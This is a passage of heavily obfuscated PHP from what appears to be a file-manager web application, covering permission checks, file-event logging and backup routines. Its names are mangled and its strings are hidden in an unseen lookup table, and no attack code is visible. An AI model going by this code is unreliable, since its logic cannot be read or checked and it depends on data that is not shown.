($ÌŞÎª­[$†Ò½ò¶[505]] == $†Ò½ò¶[197]) { $ƒˆ‡Œî¯ = !0; } if ($ÌŞÎª­[$†Ò½ò¶[411]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ƒ·‚‘´[$†Ò½ò¶[413]])) { $Ú­ØŠÖ”[] = $ÌŞÎª­[$†Ò½ò¶[505]]; } } } return array($†Ò½ò¶[600] => $Ú­ØŠÖ”, $†Ò½ò¶[2060] => $ƒˆ‡Œî¯); } public function authMake($½äØÜğè, $ÅçŸæø = false) { $ñü•ÖØœ =& $_SERVER[ĞÂ¤àÓï]; $’ª¹Ç¶ = $this->authArrayCheck($½äØÜğè, $ÅçŸæø); if ($’ª¹Ç¶[$ñü•ÖØœ[2062]]) { $’ª¹Ç¶[$ñü•ÖØœ[2062]] = $this->sourceAuthInfo($’ª¹Ç¶[$ñü•ÖØœ[2062]]); } return $’ª¹Ç¶; } public function authArrayCheck($ÁâÃÔÅË, $èéåáñ³ = false) { $Å¬õëÜ˜ =& $_SERVER[ĞÂ¤àÓï]; if (!$ÁâÃÔÅË) { return array($Å¬õëÜ˜[414] => 0, $Å¬õëÜ˜[467] => !1); } $èéåáñ³ = $èéåáñ³ ? $èéåáñ³ : USER_ID; $ÃØ¹óË˜ = 0; $ú“¡ åŞ = 0; $¿”Ï€¿Î = 0; $è¥‚÷×Ë = 0; $•‹…´¦ = 0; $”éªŒª¥ = 0; $Õµ¼¢²ß = 1000; $èúËâÂÎ = 0; $ÌÆ‹ÑóÎ = 0; $Æ¶ûÕÑ = 0; $§ò’ÎÚ© = 0; $ ÍÙãÀş = array($Å¬õëÜ˜[402] => 0); foreach ($ÁâÃÔÅË as $ ÍÙãÀş) { $Àé»ôÔ™ = $this->authInfo($ ÍÙãÀş); if (!$Àé»ôÔ™) { continue; } $÷ğàâ²‚ = $ ÍÙãÀş[$Å¬õëÜ˜[505]]; $×ğò¨¥Õ = intval($Àé»ôÔ™[$Å¬õëÜ˜[413]]); if ($ ÍÙãÀş[$Å¬õëÜ˜[411]] == SourceModel::TYPE_USER && $÷ğàâ²‚ == $èéåáñ³) { $ÃØ¹óË˜ = !0; $¿”Ï€¿Î = $Àé»ôÔ™; $ú“¡ åŞ = $×ğò¨¥Õ; } else { if ($ ÍÙãÀş[$Å¬õëÜ˜[411]] == SourceModel::TYPE_GROUP && $this->groupContainUser($÷ğàâ²‚, $èéåáñ³)) { $è¥‚÷×Ë = !0; $™Â‰Îš¤ = $this->groupStepToUserGroup($÷ğàâ²‚, $èéåáñ³); if ($™Â‰Îš¤ < $Õµ¼¢²ß) { $Õµ¼¢²ß = $™Â‰Îš¤; $•‹…´¦ = $×ğò¨¥Õ; $”éªŒª¥ = $Àé»ôÔ™; $èúËâÂÎ = $÷ğàâ²‚; } if ($™Â‰Îš¤ == $Õµ¼¢²ß && $×ğò¨¥Õ >= $•‹…´¦) { $•‹…´¦ = $×ğò¨¥Õ; $”éªŒª¥ = $Àé»ôÔ™; $èúËâÂÎ = $÷ğàâ²‚; } } else { if ($÷ğàâ²‚ == $Å¬õëÜ˜[197]) { $ÌÆ‹ÑóÎ = !0; $§ò’ÎÚ© = $Àé»ôÔ™; $Æ¶ûÕÑ = $×ğò¨¥Õ; } } } } if ($ÃØ¹óË˜) { $ßŠû¨Ï¼ = $ú“¡ åŞ; $Àé»ôÔ™ = $¿”Ï€¿Î; $­§á¹Û  = LNG($Å¬õëÜ˜[2063]); } else { if ($è¥‚÷×Ë) { $ßŠû¨Ï¼ = $•‹…´¦; $Àé»ôÔ™ = $”éªŒª¥; $îÛß¡¾§ = Model($Å¬õëÜ˜[522])->getInfo($èúËâÂÎ); $­§á¹Û  = $Å¬õëÜ˜[162] . $îÛß¡¾§[$Å¬õëÜ˜[526]] . $Å¬õëÜ˜[2064] . LNG($Å¬õëÜ˜[2065]); } else { if ($ÌÆ‹ÑóÎ) { $ßŠû¨Ï¼ = $Æ¶ûÕÑ; $Àé»ôÔ™ = $§ò’ÎÚ©; $­§á¹Û  = LNG($Å¬õëÜ˜[2036]); } else { $ßŠû¨Ï¼ = 0; $Àé»ôÔ™ = !1; $­§á¹Û  = $Å¬õëÜ˜[12]; } } } $›„¯Ÿôƒ = array($Å¬õëÜ˜[2055] => intval($ßŠû¨Ï¼), $Å¬õëÜ˜[2039] => $Àé»ôÔ™, $Å¬õëÜ˜[2056] => $­§á¹Û , $Å¬õëÜ˜[2048] => $ ÍÙãÀş[$Å¬õëÜ˜[402]]); return $›„¯Ÿôƒ; } private function groupContainUser($­ŒËÔ€, $ëµ³ï…¾ = false) { return in_array($­ŒËÔ€, $this->userGroupParents($ëµ³ï…¾)); } private function groupStepToUserGroup($½øË«ÀÊ, $÷›Í÷¹ = false) { $øê²¨•š =& $_SERVER[ĞÂ¤àÓï]; $ñÃÎ¨ì€ = $this->userGroupList($÷›Í÷¹); $Ô´ˆ¾‹ = 1000; $üŸ”ˆ»Â = $GLOBALS[$øê²¨•š[6]][$øê²¨•š[89]][$øê²¨•š[1957]] == 1; $¶¾®Ë„Â = $üŸ”ˆ»Â ? 3 : 2; foreach ($ñÃÎ¨ì€ as $°´Â²€) { if ($°´Â²€[$øê²¨•š[1854]] == $½øË«ÀÊ) { return 0; } $±œ÷Ûµ = explode($øê²¨•š[50], trim($°´Â²€[$øê²¨•š[521]], $øê²¨•š[50])); if ($±œ÷Ûµ[0] == $øê²¨•š[197] && count($±œ÷Ûµ) > $¶¾®Ë„Â) { $œÜŞÍò” = array_reverse(array_slice($±œ÷Ûµ, $¶¾®Ë„Â)); $—µá‚ª• = array_search($½øË«ÀÊ, $œÜŞÍò”); if ($—µá‚ª• !== !1 && $—µá‚ª• + 1 <= $Ô´ˆ¾‹) { $Ô´ˆ¾‹ = $—µá‚ª• + 1; } } } return $Ô´ˆ¾‹; } private function userGroupList($­´Ãöï = false) { $ìœğ¶í =& $_SERVER[ĞÂ¤àÓï]; static $íàÅÊ– = array(); if (isset($íàÅÊ–[$­´Ãöï])) { return $íàÅÊ–[$­´Ãöï]; } $µƒ®‹¿Ç = Model($ìœğ¶í[535])->getInfo($­´Ãöï); $íàÅÊ–[$­´Ãöï] = array_to_keyvalue($µƒ®‹¿Ç[$ìœğ¶í[2037]], $ìœğ¶í[1854]); return $íàÅÊ–[$­´Ãöï]; } public function userGroupParents($Ğùü¬©¨) { $´©ù ÜÄ =& $_SERVER[ĞÂ¤àÓï]; static $ı„„±‘Š = array(); $Ğùü¬©¨ = $Ğùü¬©¨ ? $Ğùü¬©¨ : USER_ID; if (isset($ı„„±‘Š[$Ğùü¬©¨])) { return $ı„„±‘Š[$Ğùü¬©¨]; } $ùÂŞş“ = $this->userGroupList($Ğùü¬©¨); $¹¸–§³¤ = array(); $ÜµÌ–Ê— = $GLOBALS[$´©ù ÜÄ[6]][$´©ù ÜÄ[89]][$´©ù ÜÄ[1957]] == 1; $ˆõ™’Ğ€ = $ÜµÌ–Ê— ? 3 : 2; foreach ($ùÂŞş“ as $ËªüÂ×£) { $á´æ®„ = array($ËªüÂ×£[$´©ù ÜÄ[1854]]); $“ÜŸµ–Á = explode($´©ù ÜÄ[50], trim($ËªüÂ×£[$´©ù ÜÄ[521]], $´©ù ÜÄ[50])); if ($“ÜŸµ–Á[0] == $´©ù ÜÄ[197] && count($“ÜŸµ–Á) > $ˆõ™’Ğ€) { $ä½‡½³è = array_slice($“ÜŸµ–Á, $ˆõ™’Ğ€); $á´æ®„ = array_merge($á´æ®„, array_reverse($ä½‡½³è)); } $¹¸–§³¤ = array_merge($¹¸–§³¤, $á´æ®„); } $ı„„±‘Š[$Ğùü¬©¨] = array_unique($¹¸–§³¤); return $ı„„±‘Š[$Ğùü¬©¨]; } public function authTargetInfoMake($‡£Ÿ¾É–) { $º”£ü¹ =& $_SERVER[ĞÂ¤àÓï]; $ƒÁßÏÉ‘ = array(); $ÎÀÀßÙ¥ = array(); foreach ($‡£Ÿ¾É– as $ç°°×à¡) { if ($ç°°×à¡[$º”£ü¹[411]] == SourceModel::TYPE_USER) { $ƒÁßÏÉ‘[] = intval($ç°°×à¡[$º”£ü¹[505]]); } else { if ($ç°°×à¡[$º”£ü¹[411]] == SourceModel::TYPE_GROUP) { $ÎÀÀßÙ¥[] = intval($ç°°×à¡[$º”£ü¹[505]]); } } } if ($ƒÁßÏÉ‘) { $ƒÁßÏÉ‘ = Model($º”£ü¹[513])->userListInfo($ƒÁßÏÉ‘); } if ($ÎÀÀßÙ¥) { $õ‚…æ» = array($º”£ü¹[1942] => array($º”£ü¹[418], $ÎÀÀßÙ¥)); $ÎÀÀßÙ¥ = Model($º”£ü¹[522])->field($º”£ü¹[2066])->where($õ‚…æ»)->select(); $ÎÀÀßÙ¥ = array_to_keyvalue($ÎÀÀßÙ¥, $º”£ü¹[1854]); } return array($º”£ü¹[2067] => $ƒÁßÏÉ‘, $º”£ü¹[2068] => $ÎÀÀßÙ¥); } public function authInfo($—µøÁÇã) { $™š×¢Í =& $_SERVER[ĞÂ¤àÓï]; if ($—µøÁÇã[$™š×¢Í[1958]]) { $™‰ÑÏ­ = Model($™š×¢Í[507])->listData($—µøÁÇã[$™š×¢Í[1958]]); if (!$™‰ÑÏ­) { return !1; $·¤Šƒ‘Û = Model($™š×¢Í[507])->listData(); $È‚ˆÒÕ = array_filter_by_field($·¤Šƒ‘Û, $™š×¢Í[413], $™š×¢Í[197]); return $È‚ˆÒÕ; } $¿é¨÷ƒ = array_field_key($™‰ÑÏ­, array($™š×¢Í[399], $™š×¢Í[32], $™š×¢Í[413], $™š×¢Í[1877], $™š×¢Í[1878])); $¿é¨÷ƒ[$™š×¢Í[2069]] = $—µøÁÇã; return $¿é¨÷ƒ; } else { return array($™š×¢Í[419] => 0, $™š×¢Í[1860] => $—µøÁÇã[$™š×¢Í[2014]], $™š×¢Í[420] => $™š×¢Í[12], $™š×¢Í[1877] => $™š×¢Í[2070]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\x75\162\x63\x65\137\x65\166\x65\x6e\x74"; protected $dataAuto = array(array("\x63\x72\145\141\164\x65\124\151\x6d\x65", "\x74\151\155\x65", "\151\156\163\x65\162\x74", "\146\165\x6e\143\x74\151\157\x6e"), array("\x64\x65\x73\143", '', "\x69\156\x73\x65\x72\164\x2c\x75\x70\144\x61\x74\x65\x2c\x73\145\x6c\145\143\164", "\x6a\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($šŒîˆÌ, $Ìóó‘¸¯, $ÇÒ§†Æó = '') { $Ş½ç¥ï‘ =& $_SERVER[ĞÂ¤àÓï]; if (!$this->eventSave) { return; } $¾Ù€‰¨Ÿ = Model($Ş½ç¥ï‘[1336])->sourceInfo($šŒîˆÌ); if (!$¾Ù€‰¨Ÿ) { return !1; } if ($this->isCacheEvent($¾Ù€‰¨Ÿ, $Ìóó‘¸¯)) { return; } if ($ÇÒ§†Æó && is_string($ÇÒ§†Æó)) { $ÇÒ§†Æó = array($Ş½ç¥ï‘[1893] => $ÇÒ§†Æó); } $Ãì‡…á… = array($Ş½ç¥ï‘[417] => $šŒîˆÌ, $Ş½ç¥ï‘[2071] => $¾Ù€‰¨Ÿ[$Ş½ç¥ï‘[432]], $Ş½ç¥ï‘[2072] => $¾Ù€‰¨Ÿ[$Ş½ç¥ï‘[32]], $Ş½ç¥ï‘[519] => !empty($¾Ù€‰¨Ÿ[$Ş½ç¥ï‘[519]]) ? $¾Ù€‰¨Ÿ[$Ş½ç¥ï‘[519]] : $Ş½ç¥ï‘[12], $Ş½ç¥ï‘[1655] => USER_ID, $Ş½ç¥ï‘[422] => $Ìóó‘¸¯, $Ş½ç¥ï‘[1657] => $ÇÒ§†Æó); $this->addSystemLog($Ìóó‘¸¯, $Ãì‡…á…); unset($Ãì‡…á…[$Ş½ç¥ï‘[2072]], $Ãì‡…á…[$Ş½ç¥ï‘[519]]); return $this->add($Ãì‡…á…); } private function addSystemLog($¯‚ÃÑ‚à, $öüçĞÑñ) { $É‡Å»î =& $_SERVER[ĞÂ¤àÓï]; if ($¯‚ÃÑ‚à == $É‡Å»î[2073]) { $¯‚ÃÑ‚à = $öüçĞÑñ[$É‡Å»î[453]][$É‡Å»î[2074]]; } else { if (in_array($¯‚ÃÑ‚à, array($É‡Å»î[1834], $É‡Å»î[2075]))) { $¯‚ÃÑ‚à = $öüçĞÑñ[$É‡Å»î[453]][$É‡Å»î[754]]; } } $ÕˆñºÀÊ = array_merge($öüçĞÑñ, array($É‡Å»î[2076] => $öüçĞÑñ[$É‡Å»î[402]], $É‡Å»î[2077] => $öüçĞÑñ[$É‡Å»î[2077]])); Hook::trigger($É‡Å»î[2078], $É‡Å»î[2079] . $¯‚ÃÑ‚à, $öüçĞÑñ); Model($É‡Å»î[1798])->addLog($É‡Å»î[2079] . $¯‚ÃÑ‚à, $ÕˆñºÀÊ); } private function isCacheEvent($³ƒ„„‰¨, $©úöˆœœ) { if ($³ƒ„„‰¨[$_SERVER[ĞÂ¤àÓï][411]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($¯ûÍ˜, $Ã£œ‚ô¹) { $µ­Éğ‘ =& $_SERVER[ĞÂ¤àÓï]; $úÃêĞÇ = Model($µ­Éğ‘[1336])->sourceInfo($¯ûÍ˜); $˜¾îÅ‹Ê = array($µ­Éğ‘[2074] => $Ã£œ‚ô¹, $µ­Éğ‘[32] => $úÃêĞÇ[$µ­Éğ‘[32]]); return $this->addEvent($¯ûÍ˜, $µ­Éğ‘[2073], $˜¾îÅ‹Ê); } public function eventFileEdit($«ŠÑ­â) { $‚É ½±Ê =& $_SERVER[ĞÂ¤àÓï]; $™™ò“Õå = array($‚É ½±Ê[2080] => $_SERVER[$‚É ½±Ê[2081]], $‚É ½±Ê[2082] => strtolower(ACTION)); if (isset($GLOBALS[$‚É ½±Ê[7]][$‚É ½±Ê[2083]])) { $™™ò“Õå[$‚É ½±Ê[2083]] = $‚É ½±Ê[88]; } return $this->addEvent($«ŠÑ­â, $‚É ½±Ê[1824], $™™ò“Õå); } public function eventRecycle($¯½¶”÷û, $Ø°­æÉ•) { return $this->addEvent($¯½¶”÷û, $_SERVER[ĞÂ¤àÓï][2075], $Ø°­æÉ•); } public function eventRemove($†Ü–¥Í) { $‹¡µøÓ• =& $_SERVER[ĞÂ¤àÓï]; $á’ÚŠö¹ = Model($‹¡µøÓ•[1336])->sourceInfo($†Ü–¥Í); $‹ìş÷ãÃ = $á’ÚŠö¹[$‹¡µøÓ•[32]]; return $this->addEvent($á’ÚŠö¹[$‹¡µøÓ•[432]], $‹¡µøÓ•[1823], $‹ìş÷ãÃ); } public function eventShare($ëğ»ñ¦ı, $»ë‚·ò¯) { return $this->addEvent($ëğ»ñ¦ı, $_SERVER[ĞÂ¤àÓï][1834], $»ë‚·ò¯); } public function eventMove($šÑ“ı¯Ç, $·Óç½®¹, $À­ç—§) { $°ÉŒ¡îş =& $_SERVER[ĞÂ¤àÓï]; $´ÅÉò½ş = Model($°ÉŒ¡îş[1336]); $Ø®ØöÔÑ = $´ÅÉò½ş->sourceInfo($šÑ“ı¯Ç); $¯ŒÀØì¨ = $´ÅÉò½ş->sourceInfo($·Óç½®¹); $ ¸ êÀ¦ = $´ÅÉò½ş->sourceInfo($À­ç—§); $¾‡¾İ¥Ë = array($°ÉŒ¡îş[1160] => $·Óç½®¹, $°ÉŒ¡îş[2084] => $¯ŒÀØì¨[$°ÉŒ¡îş[32]], $°ÉŒ¡îş[2062] => !empty($¯ŒÀØì¨[$°ÉŒ¡îş[519]]) ? $¯ŒÀØì¨[$°ÉŒ¡îş[519]] : $°ÉŒ¡îş[12], $°ÉŒ¡îş[1161] => $À­ç—§, $°ÉŒ¡îş[2085] => $ ¸ êÀ¦[$°ÉŒ¡îş[32]], $°ÉŒ¡îş[2086] => !empty($ ¸ êÀ¦[$°ÉŒ¡îş[519]]) ? $ ¸ êÀ¦[$°ÉŒ¡îş[519]] : $°ÉŒ¡îş[12]); $this->addEvent($šÑ“ı¯Ç, $°ÉŒ¡îş[557], $¾‡¾İ¥Ë); $Ø®ØöÔÑ = $´ÅÉò½ş->sourceInfo($šÑ“ı¯Ç); $¾‡¾İ¥Ë = array($°ÉŒ¡îş[402] => $Ø®ØöÔÑ[$°ÉŒ¡îş[402]], $°ÉŒ¡îş[32] => $Ø®ØöÔÑ[$°ÉŒ¡îş[32]]); $this->addEvent($·Óç½®¹, $°ÉŒ¡îş[2087], $¾‡¾İ¥Ë); } public function eventCopy($ıŒ…¢åË) { $this->eventCreate($ıŒ…¢åË, $_SERVER[ĞÂ¤àÓï][555]); } public function eventRename($¤ é£„è, $ÙÒ¯Ÿ™Ÿ, $áöêá³) { $­™ó¸«Ş =& $_SERVER[ĞÂ¤àÓï]; $àææÍÉí = array($­™ó¸«Ş[1160] => $ÙÒ¯Ÿ™Ÿ, $­™ó¸«Ş[1161] => $áöêá³); return $this->addEvent($¤ é£„è, $­™ó¸«Ş[1351], $àææÍÉí); } public function eventAddComment($¸¦ÔĞğ, $Åûƒ‰ÃŞ) { return $this->addEvent($¸¦ÔĞğ, $_SERVER[ĞÂ¤àÓï][2088], $Åûƒ‰ÃŞ); } public function eventAddDesc($°ÅñÙ¹ó, $¡ï»“¬) { return $this->addEvent($°ÅñÙ¹ó, $_SERVER[ĞÂ¤àÓï][2089], $¡ï»“¬); } public function listBySource($Ô™«áİ) { $Àõøíõ÷ =& $_SERVER[ĞÂ¤àÓï]; $‰ÄÎÊ’ = Model($Àõøíõ÷[1336])->sourceInfo($Ô™«áİ); $åúê‘˜Ì = array($Àõøíõ÷[417] => $Ô™«áİ); if ($‰ÄÎÊ’[$Àõøíõ÷[410]] == $Àõøíõ÷[88]) { $­¨ßÕÄ = Model($Àõøíõ÷[1336])->listSearchChildren($Ô™«áİ, 20000); $­¨ßÕÄ[] = $Ô™«áİ . $Àõøíõ÷[378]; $åúê‘˜Ì = array($Àõøíõ÷[402] => array($Àõøíõ÷[7], $­¨ßÕÄ)); } $³¡ğ¿˜Î = $this->where($åúê‘˜Ì)->order($Àõøíõ÷[2090])->selectPage(); if ($³¡ğ¿˜Î[$Àõøíõ÷[366]][$Àõøíõ÷[367]] == 0) { $³¡ğ¿˜Î[$Àõøíõ÷[366]][$Àõøíõ÷[367]] = 1; $³¡ğ¿˜Î[$Àõøíõ÷[369]] = array(array($Àõøíõ÷[417] => $Ô™«áİ, $Àõøíõ÷[2071] => $‰ÄÎÊ’[$Àõøíõ÷[432]], $Àõøíõ÷[1655] => $‰ÄÎÊ’[$Àõøíõ÷[454]], $Àõøíõ÷[422] => $Àõøíõ÷[2091], $Àõøíõ÷[423] => $‰ÄÎÊ’[$Àõøíõ÷[200]], $Àõøíõ÷[1657] => $Àõøíõ÷[12])); } return $this->eventListParse($³¡ğ¿˜Î, $Ô™«áİ); } private function eventListParse($°ıÖÄ™, $¡‰Â¸ù) { $Ãœô£œ… =& $_SERVER[ĞÂ¤àÓï]; $Ÿ½æü¦İ = $°ıÖÄ™[$Ãœô£œ…[369]]; $€¬ô–ş¢ = array_to_keyvalue($Ÿ½æü¦İ, $Ãœô£œ…[12], $Ãœô£œ…[402]); $ğ¨Û‹Ì = array_to_keyvalue($Ÿ½æü¦İ, $Ãœô£œ…[12], $Ãœô£œ…[2077]); foreach ($Ÿ½æü¦İ as $°ØïØ Ò) { $ãÚÙª = $°ØïØ Ò[$Ãœô£œ…[453]]; if ($°ØïØ Ò[$Ãœô£œ…[33]] == $Ãœô£œ…[557] && isset($ãÚÙª[$Ãœô£œ…[1160]])) { $€¬ô–ş¢[] = $ãÚÙª[$Ãœô£œ…[1160]] . $Ãœô£œ…[12]; $€¬ô–ş¢[] = $ãÚÙª[$Ãœô£œ…[1161]] . $Ãœô£œ…[12]; } if ($°ØïØ Ò[$Ãœô£œ…[33]] == $Ãœô£œ…[2087] && isset($ãÚÙª[$Ãœô£œ…[402]])) { $€¬ô–ş¢[] = $ãÚÙª[$Ãœô£œ…[402]] . $Ãœô£œ…[12]; } } $€¬ô–ş¢ = array_merge($€¬ô–ş¢, $ğ¨Û‹Ì, array($¡‰Â¸ù . $Ãœô£œ…[12])); $€¬ô–ş¢ = array_unique($€¬ô–ş¢); $Â–å‘êÈ = array_unique(array_to_keyvalue($Ÿ½æü¦İ, $Ãœô£œ…[12], $Ãœô£œ…[1664])); $œÕ¢€Õ– = Model($Ãœô£œ…[535])->userListInfo($Â–å‘êÈ); $Ö½®Ì = Model($Ãœô£œ…[832])->sourceListInfo($€¬ô–ş¢, !0); foreach ($Ÿ½æü¦İ as &$°ØïØ Ò) { if ($°ØïØ Ò[$Ãœô£œ…[33]] == $Ãœô£œ…[557] && isset($°ØïØ Ò[$Ãœô£œ…[453]][$Ãœô£œ…[1160]])) { $°ØïØ Ò[$Ãœô£œ…[453]][$Ãœô£œ…[1160]] = $Ö½®Ì[$°ØïØ Ò[$Ãœô£œ…[453]][$Ãœô£œ…[1160]]]; $°ØïØ Ò[$Ãœô£œ…[453]][$Ãœô£œ…[1161]] = $Ö½®Ì[$°ØïØ Ò[$Ãœô£œ…[453]][$Ãœô£œ…[1161]]]; } if ($°ØïØ Ò[$Ãœô£œ…[33]] == $Ãœô£œ…[2087] && isset($°ØïØ Ò[$Ãœô£œ…[453]][$Ãœô£œ…[402]])) { $°ØïØ Ò[$Ãœô£œ…[453]][$Ãœô£œ…[402]] = $Ö½®Ì[$°ØïØ Ò[$Ãœô£œ…[453]][$Ãœô£œ…[402]]]; } $°ØïØ Ò[$Ãœô£œ…[86]] = $Ö½®Ì[$°ØïØ Ò[$Ãœô£œ…[402]]]; $°ØïØ Ò[$Ãœô£œ…[2092]] = $Ö½®Ì[$°ØïØ Ò[$Ãœô£œ…[2077]]]; if ($°ØïØ Ò[$Ãœô£œ…[33]] == $Ãœô£œ…[1823]) { $°ØïØ Ò[$Ãœô£œ…[2092]] = $°ØïØ Ò[$Ãœô£œ…[86]]; $°ØïØ Ò[$Ãœô£œ…[2077]] = $°ØïØ Ò[$Ãœô£œ…[2092]][$Ãœô£œ…[402]]; $°ØïØ Ò[$Ãœô£œ…[86]] = !1; $°ØïØ Ò[$Ãœô£œ…[402]] = $Ãœô£œ…[12]; } $°ØïØ Ò[$Ãœô£œ…[2022]] = $œÕ¢€Õ–[$°ØïØ Ò[$Ãœô£œ…[1664]]]; } unset($°ØïØ Ò); $°ıÖÄ™[$Ãœô£œ…[369]] = $Ÿ½æü¦İ; return $°ıÖÄ™; } public function removeBySource($Œ ÁÔÓ€) { $®úÔ´´ = array($_SERVER[ĞÂ¤àÓï][417] => $Œ ÁÔÓ€); $this->where($®úÔ´´)->remove(); } } goto AÜæï«í; B´×Ÿ³ˆËÍ: class BackupDbFile { public function __construct() { } public function index() { $ù…ó¾½° =& $_SERVER[ĞÂ¤àÓï]; $¦´”Æ‚‹ = Backup::get(); $Ä’šìˆ† = $¦´”Æ‚‹[$ù…ó¾½°[32]]; $É¸î•Şê = $this->tmpFilesPath() . "\x62\x61\x63\153\165\x70\137{$Ä’šìˆ†}\x2f"; $…–Æ¹–§ = $this->backupPath($¦´”Æ‚‹); if (!($…–Æ¹–§ = IO::mkdir($…–Æ¹–§))) { return !1; } $¿ÄÍÀä¹ = IO::listPath($É¸î•Şê); $ş¯’ÚÀ = isset($¿ÄÍÀä¹[$ù…ó¾½°[83]]) ? $¿ÄÍÀä¹[$ù…ó¾½°[83]] : array(); $ñˆû í¤ = array_sum(array_column($ş¯’ÚÀ, $ù…ó¾½°[76])); if (!$ñˆû í¤) { return !1; } $Ñà³®¿­ = array($ù…ó¾½°[805] => $ñˆû í¤, $ù…ó¾½°[806] => time()); Backup::set($Ñà³®¿­); $Ø–šÓÎ = new TaskFileTransfer($ù…ó¾½°[807], $ù…ó¾½°[787], count($ş¯’ÚÀ), LNG($ù…ó¾½°[788]) . $ù…ó¾½°[386] . LNG($ù…ó¾½°[790]) . $ù…ó¾½°[808]); $Ø–šÓÎ->task[$ù…ó¾½°[762]] = $ñˆû í¤; foreach ($¿ÄÍÀä¹[$ù…ó¾½°[83]] as $ÃÂö¡»˜) { $ıËˆ°×ú = IO::move($ÃÂö¡»˜[$ù…ó¾½°[84]], $…–Æ¹–§); if (!$ıËˆ°×ú) { $Ø–šÓÎ->end(); $ÑÃ£ªª¶ = IO::getLastError($ù…ó¾½°[809] . $ÃÂö¡»˜[$ù…ó¾½°[84]] . $ù…ó¾½°[810] . $…–Æ¹–§ . $ù…ó¾½°[164]); write_log($ÑÃ£ªª¶, $ù…ó¾½°[787]); return !1; } } $»Í„€û = new DbManage(); $—®¯ÖÕÚ = $»Í„€û->getSqlFile(); if (!$—®¯ÖÕÚ[$ù…ó¾½°[811]] || !$—®¯ÖÕÚ[$ù…ó¾½°[13]]) { return !1; } IO::move($—®¯ÖÕÚ[$ù…ó¾½°[811]], $…–Æ¹–§); IO::move($—®¯ÖÕÚ[$ù…ó¾½°[13]], $…–Æ¹–§); $Ø–šÓÎ->end(); $Ñà³®¿­ = array($ù…ó¾½°[812] => $ñˆû í¤, $ù…ó¾½°[813] => time()); Backup::set($Ñà³®¿­); return !0; } private function backupPath($éæŞôõï) { $ÔÖ€Ï± =& $_SERVER[ĞÂ¤àÓï]; $Ğã¼ÖéÈ = $éæŞôõï[$ÔÖ€Ï±[32]]; $‘íêä×Ë = Model($ÔÖ€Ï±[769])->get($ÔÖ€Ï±[770]); $Ï˜Í®èí = substr(md5($ÔÖ€Ï±[771] . $‘íêä×Ë . $Ğã¼ÖéÈ), 0, 8); return "\173\151\157\x3a{$éæŞôõï[$ÔÖ€Ï±[751]]}\175\57\x64\141\x74\x61\x62\x61\163\x65\x2f\142\x61\x63\x6b\165\x70\57" . $Ğã¼ÖéÈ . $ÔÖ€Ï±[11] . $Ï˜Í®èí; } private function tmpFilesPath() { $ÀĞÂí³ =& $_SERVER[ĞÂ¤àÓï]; $î¶ı¨Á = TEMP_FILES; if ($GLOBALS[$ÀĞÂí³[6]][$ÀĞÂí³[89]][$ÀĞÂí³[803]]) { $î¶ı¨Á = $GLOBALS[$ÀĞÂí³[6]][$ÀĞÂí³[89]][$ÀĞÂí³[803]]; if (!mk_dir($î¶ı¨Á) || !is_writable($î¶ı¨Á) || !IO::mkfile($î¶ı¨Á . $ÀĞÂí³[804])) { $î¶ı¨Á = TEMP_FILES; } } return $î¶ı¨Á; } } class BackupFile { public function __construct() { } public function index() { $š¹ßË³± = Backup::get(); $Ô×ü×Ó“ = $š¹ßË³±[$_SERVER[ĞÂ¤àÓï][293]][$_SERVER[ĞÂ¤àÓï][199]][$_SERVER[ĞÂ¤àÓï][468]]; $áÁÃ´ˆë = array($_SERVER[ĞÂ¤àÓï][469] => array($_SERVER[ĞÂ¤àÓï][814], $Ô×ü×Ó“), $_SERVER[ĞÂ¤àÓï][815] => array($_SERVER[ĞÂ¤àÓï][331], $š¹ßË³±[$_SERVER[ĞÂ¤àÓï][751]])); $Ö”úÜËê = (int) Model($_SERVER[ĞÂ¤àÓï][796])->where($áÁÃ´ˆë)->count($_SERVER[ĞÂ¤àÓï][468]); $Ü•·‰¡× = (int) Model($_SERVER[ĞÂ¤àÓï][796])->where($áÁÃ´ˆë)->sum($_SERVER[ĞÂ¤àÓï][76]); $¸œø±Å° = new TaskFileTransfer($_SERVER[ĞÂ¤àÓï][816], $_SERVER[ĞÂ¤àÓï][787], $Ö”úÜËê, LNG($_SERVER[ĞÂ¤àÓï][788]) . $_SERVER[ĞÂ¤àÓï][789] . LNG($_SERVER[ĞÂ¤àÓï][817])); $¸œø±Å°->task[$_SERVER[ĞÂ¤àÓï][762]] = $Ü•·‰¡×; $ç³ä¨˜ş = array($_SERVER[ĞÂ¤àÓï][818] => $Ö”úÜËê, $_SERVER[ĞÂ¤àÓï][819] => $Ü•·‰¡×, $_SERVER[ĞÂ¤àÓï][820] => time()); Backup::set($ç³ä¨˜ş); $éÄÔ·äÕ = !0; $¯ôÎÆÃÊ = $this->storeIds(); $¥Ó‚ú®Ì = 1; $İ‘‰‡É = 1000; $½…”Ÿûğ = $ÈæÈóöÍ = 0; $÷£×Úš = array(); $Œ“­®©– = $ºæÉĞ¥  = 0; do { $ÕÔÊ’½ï = $_SERVER[ĞÂ¤àÓï][821]; $×¦¯ÏÂ¬ = Model($_SERVER[ĞÂ¤àÓï][796])->where($áÁÃ´ˆë)->field($ÕÔÊ’½ï)->order($_SERVER[ĞÂ¤àÓï][822])->selectPage($İ‘‰‡É, $¥Ó‚ú®Ì); $Æ‡æ´´ì = !empty($×¦¯ÏÂ¬[$_SERVER[ĞÂ¤àÓï][369]]) ? $×¦¯ÏÂ¬[$_SERVER[ĞÂ¤àÓï][369]] : array(); foreach ($Æ‡æ´´ì as $ÚİÙîš±) { if (!$this->_fileExist($ÚİÙîš±, $÷£×Úš, $¯ôÎÆÃÊ)) { $Ö”úÜËê -= 1; $Ü•·‰¡× -= (int) $ÚİÙîš±[$_SERVER[ĞÂ¤àÓï][76]]; write_log("\x66\x69\x6c\x65\40\156\157\x74\x20\145\170\151\x73\164\x2e\146\151\x6c\x65\x49\104\72{$ÚİÙîš±[$_SERVER[ĞÂ¤àÓï][468]]}\54\x20\160\141\x74\150\72{$ÚİÙîš±[$_SERVER[ĞÂ¤àÓï][84]]}", $_SERVER[ĞÂ¤àÓï][823]); continue; } $À²µùş† = $ÚİÙîš±[$_SERVER[ĞÂ¤àÓï][84]]; $–È¬Ş°á = "\x7b\151\157\72{$š¹ßË³±[$_SERVER[ĞÂ¤àÓï][751]]}\x7d" . substr($À²µùş†, 